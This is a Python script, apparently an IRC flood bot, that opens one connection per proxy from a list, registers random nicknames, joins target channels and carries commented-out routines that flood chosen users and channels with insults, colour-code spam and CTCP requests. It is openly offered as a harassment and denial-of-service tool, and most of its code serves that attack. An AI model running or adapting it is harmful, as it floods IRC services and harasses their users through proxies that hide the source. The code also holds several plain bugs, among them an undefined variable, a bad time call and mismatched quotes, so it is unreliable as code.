#####################################################################
#####################################################################
## Project by #Metasploit            ## This Is My Good Version xD ##
## Authors: DD0S, KOISSER, @Efnet    ## Python Script For Flood    ##
## This is My Version,               ## With Random Proxy List     ##
## koisser.py v3.2 2018              ## Ap0calypse69@hotmail.com   ##
## socks.py V3.2 2018                ## Maydennmaelly@hotmail.com  ##
#####################################################################
#########  MODULE  ########  KOISSER  ########  DD0S  ###############
#####################################################################
#
import socks
import socket
import random
import threading
import time
import string
##################################
######### CONFIG HERE ############
##################################
server = "irc.inet.tele.dk"
port = 6667
targetchan = ["#koisser", "#koisser1", "#koisser2", "#test", "#example"]
#targetnick = ["chrono", "DunX"] # Example
#targetmsg = ["pussy", "takataa", "looser", "fuck", "haha", "bitch", "tamere"]
#proxylist = "proxy.txt"
#nicklist = "nick.txt"
#nickserv = "NickServ"
#passwd = "asdfghjkl0123"
##################################################################
########## CODE HERE DONT EDIT IT WITHOUT KNOWLEDGE! #############
##################################################################
#-# Random string based on a seed and a bunch of letters #########
def generateWord():
    char_array = 'abcdefghijklmnopqrstuvwxyzABCDEFHIJKLMNOPQRSTUVWXYZ'
    random.seed(time()) #-# seed goes here. time() might not be the best.
    word = ''
    for i in range(0,8): #-# 8 letter word
        word += char_array[random.randint(0,50)] # Not 50???
    return word  #-# returns the word.
##################################################################
i = 0
fil = open(proxylist, "r")
lines = fil.readlines()
fil.close()
random.shuffle(lines)
#a = 0
#nickfil = open(nicklist, "r")
#nicks = nickfil.readlines()
#nickfil.close()
#random.shuffle(nicks)

class MyThread(threading.Thread):
    def run(self):
        number = random.randint(1,99999)
        ircsock = socks.socksocket()

        choice = proxy.split(":") #-# Isn't-it "lines"?

        pport = choice[1]
        pserver = choice[0]

        lol = 1
        pport = pport.replace("\n", "")

        try:
            ircsock.setproxy(socks.PROXY_TYPE_HTTP, pserver, int(pport))
            ircsock.connect((server, port))
            ircsock.send("USER "+ nick +" "+ nick +" "+ nick +" :"+ nick +"\n")
            ircsock.send("NICK "+ nick +"\n")

            while 1:
                ircmsg = ircsock.recv(1)

                ircmsg = ircmsg.strip('\n')

                #-# Not all IRC's send back a resonse in /n/r,
                #-# but /n is always there, so we add a if statment to check
                #-# if 7r is there and strip it if its present.
                if "\r" in ircmsg:
                   ircmsg = ircmsg.strip("\r")
                ircmsg = ircmsg.lower()
                number = random.randint(200,400)
                chn = random.choice(targetchan)
                print ircmsg

                ircsock.send("JOIN "+ chn +"\n")

                #-# request of the IRC Deamon
                if ircmsg.find("ping :") != -1:
                    if ircmsg.find("timeout") != -1 or ircmsg.find("quit") != -1:
                        print("beep")

                    else:
                        ping = ircmsg.split("ping :")
                        ircsock.send("PONG "+ ping[1] +"\n")

                #-# Attack Here For FUN #-#
                #ircsock.send("PRIVMSG " + nickserv + " :identify passwd\n') # Register NickName
                #if ircmsg.find("criss") != -1:
                #ircsock.send("PRIVMSG " + chn + " :Tamere a Toute Les Soire xD\03\n') # Just That lol
                #if ircmsg.find("!version") != -1:
                #ircsock.send("PRIVMSG " + chn + " :FloodBOT v3.2 - A Bot By KOISSER\03\n') # Gives Bot Info
                #if ircmsg.find("tbnk") != -1:
		#ircsock.send("PRIVMSG " + chn + " :STOP THIS RIGHT NOW\03\n') # Gives Bot Warning
                #ircsock.sendall('NICK ' + ''.join(random.choice(string.letters) for _  in xrange(nicklength)) + '\r\n')

                #-# Attack For Nicknames #-#
                ##spam = "".join(random.choice(string.letters) for _ in range(number))
                ##ircsock.send("PRIVMSG " + targetnick + " :" + spam + "\n")
                ##ircsock.send("PRIVMSG " + targetnick + " :\001VERSION\001\n")
                ##ircsock.send("PRIVMSG " + targetnick + " :" + targetmsg + "\n")
                ##ircsock.send("PRIVMSG " + targetnick + " :" + random.choice(targetmsg) + "\n")
                ##ircsock.send("PRIVMSG " + targetnick + " :\x0307,01BLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLA\x03\n")
                ##ircsock.send("PRIVMSG " + targetnick + " :\x0304,02HAHHAHAHAHAHAHAHAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHHAHAHAHHAAHHAAHHAAHAHAHAAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHHAHAHAHHAAHHAAHHAAHAHAHAAHHAHAHAHAHAHAHAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHHAHAHAHHAAHHAAHHAAHAHAHAAHHAHAHAHAHAHAHAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHHAHAHAHHAAHHAAHHAAHAHAHAAHHAHAHAHAHAHAHAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHHAHAHAHHAAHHAAHHAAHAHAHAAHHAHAHAHAHAHAHAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHHAHAHAHHAAHHAAHHAAHAAAHAHHAAHAHAHAHAHAHAHAHAHAHAHAHHAHAHAHAAHHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHHAHAHHAHAHAHA\x03\n")
                ##ircsock.send("PRIVMSG " + targetnick + " :\x0302,04LOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLLOLOOLOLOLOOLOLOLOLOLOLOLOOLOLOLOLOLOLOLOLLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLLOLOOLOLOLOOLOLOLOLOLOLOLOOLOLOLOLOLOLOLOLLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLLOLOOLOLOLOOLOLOLOLOLOLOLOOLOLOLOLOLOLOLOLLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLLOLOOLOLOLOOLOLOLOLOLOLOLOOLOLOLOLOLOLOLOLLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLLOLOOLOLOLOOLOLOLOLOLOLOLOOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLOOOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLLLOL\x03\n")
                ##ircsock.send("PRIVMSG " + targetnick + " :\x0307,03BLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLA\x03\n")

                #-# Attack For Channels #-#
                ##spam = "".join(random.choice(string.letters) for _ in range(number))
                ##ircsock.send("PRIVMSG " + chn + " :" + spam + "\n")
                ##ircsock.send("PRIVMSG " + chn + " :\001VERSION\001\n")
                ##ircsock.send("PRIVMSG " + chn + " :" + targetmsg + "\n")
                ##ircsock.send("PRIVMSG " + chn + " :" + random.choice(targetmsg) + "\n")
                ##ircsock.send("PRIVMSG " + chn + " :\x0307,01BLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLA\x03\n")
                ##ircsock.send("PRIVMSG " + chn + " :\x0304,02HAHHAHAHAHAHAHAHAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHHAHAHAHHAAHHAAHHAAHAHAHAAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHHAHAHAHHAAHHAAHHAAHAHAHAAHHAHAHAHAHAHAHAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHHAHAHAHHAAHHAAHHAAHAHAHAAHHAHAHAHAHAHAHAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHHAHAHAHHAAHHAAHHAAHAHAHAAHHAHAHAHAHAHAHAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHHAHAHAHHAAHHAAHHAAHAHAHAAHHAHAHAHAHAHAHAHHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHHAHHAHAHAHHAAHHAAHHAAHAAAHAHHAAHAHAHAHAHAHAHAHAHAHAHAHHAHAHAHAAHHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHHAHAHHAHAHAHA\x03\n")
                ##ircsock.send("PRIVMSG " + chn + " :\x0302,04LOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLLOLOOLOLOLOOLOLOLOLOLOLOLOOLOLOLOLOLOLOLOLLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLLOLOOLOLOLOOLOLOLOLOLOLOLOOLOLOLOLOLOLOLOLLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLLOLOOLOLOLOOLOLOLOLOLOLOLOOLOLOLOLOLOLOLOLLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLLOLOOLOLOLOOLOLOLOLOLOLOLOOLOLOLOLOLOLOLOLLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLLOLOOLOLOLOOLOLOLOLOLOLOLOOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLOOOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLLLOL\x03\n")
                ##ircsock.send("PRIVMSG " + chn + " :\x0307,03BLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLABLA\x03\n")


                time.sleep(0,01)
        except:
            ircsock.close()
#for x in xrange(900000):
#	nick = nicks[a]
#	print("Proxy #)
#	a = a + 1
for x in xrange(len(lines)):
    nicklength = random.randint(3,9)
    number = random.randint(1,9)
    nick = "".join(random.choice(string.letters) for _ in range(nicklength))

    proxy = lines[i]

    print(i)
    i = i + 1

    MyThread().start()
    time.sleep(0.01)

